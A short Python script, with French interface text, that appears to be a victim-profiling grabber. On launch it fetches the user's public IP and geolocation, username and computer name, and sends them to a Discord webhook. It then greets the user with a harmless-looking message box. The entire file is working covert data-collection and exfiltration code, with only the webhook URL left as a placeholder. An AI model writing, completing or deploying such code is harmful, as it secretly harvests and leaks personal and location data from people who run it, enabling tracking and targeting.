import tkinter as tk
import socket
import requests
from tkinter import messagebox
import platform
import os
from discord_webhook import DiscordWebhook, DiscordEmbed

def send_to_discord():
    ip_address = requests.get('https://ipinfo.io').json()['ip']
    ip_info = get_ip_info(ip_address)

    user_info, computer_info = get_user_and_computer_info()
    
    embed = DiscordEmbed(title="Informations de l'ordinateur 🖥️", color=0x6D0505)
    embed.add_embed_field(name="Utilisateur 👤", value=user_info)
    embed.add_embed_field(name="Nom du PC 📛", value=computer_info)
    
    embed_ip = DiscordEmbed(title="Ip info", color=0x6D0505)
    embed_ip.add_embed_field(name="IP Address", value=ip_address)
    embed_ip.add_embed_field(name="Country 🌍", value=ip_info.get('country'))
    embed_ip.add_embed_field(name="City 🏙️", value=ip_info.get('city'))
    embed_ip.add_embed_field(name="Region 🌐", value=ip_info.get('region'))
    embed_ip.add_embed_field(name="Organization 🏢", value=ip_info.get('org'))
    embed_ip.add_embed_field(name="Location 📍", value=ip_info.get('loc'))
    embed_ip.add_embed_field(name="Postal Code 📮", value=ip_info.get('postal'))
    embed_ip.add_embed_field(name="Timezone ⌛", value=ip_info.get('timezone'))

    webhook_url = "WEBHOOK HERE"
    webhook = DiscordWebhook(url=webhook_url, embeds=[embed, embed_ip])
    
    response = webhook.execute()

    user = os.getlogin()
    messagebox.showinfo("Info", f"Salut {user}")

def get_ip_info(ip):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url)
    data = response.json()
    return data

def get_user_and_computer_info():
    user = os.getlogin()
    computer_name = os.environ['COMPUTERNAME']
    return f"Utilisateur 👤 : {user}", f"Nom du PC 📛 : {computer_name}"
    messagebox.showinfo("Info", f"Salut {user}")

send_to_discord()
